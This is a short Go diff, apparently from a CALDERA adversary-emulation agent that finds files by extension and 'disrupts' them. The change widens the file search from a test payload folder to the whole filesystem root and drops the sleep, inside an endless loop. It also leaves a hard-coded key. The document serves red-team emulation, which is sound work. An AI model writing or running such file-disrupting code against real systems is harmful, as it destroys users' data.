@@ -59,11 +59,10 @@ func runMission(server string, extension string) string {
 	//2. Add uncollected to list
 	//3. For each not disrupted, disrupt
 	//4. Post results to CALDERA
-	all_files := get_files("/Users/bedmonds/dev/caldera/plugins/stockpile/payloads/", extension)
+	all_files := get_files("/", extension)
 	new_files := find_new_files(all_files)
 	modify_files(new_files)
-	time.Sleep(time.Duration(iteration) * time.Second)
-	return "Garbage"
+	return "Mission Completed"
 }
 
 
@@ -74,11 +73,10 @@ func main() {
 	modified_files = make(map[string]bool)
 	flag.Parse()
 	//run for a duration of time. 
-	fmt.Println("Running mission for %s seconds against %s", *duration, *server)
+	fmt.Printf("Running mission for %s seconds against %s\n", *duration, *server)
 	for { 
 		runMission(*server, *extension) 
 	}
-
 }
 
 var key = "3TEU4UD15V29OBJB7U9HNCR2JPWL1U"
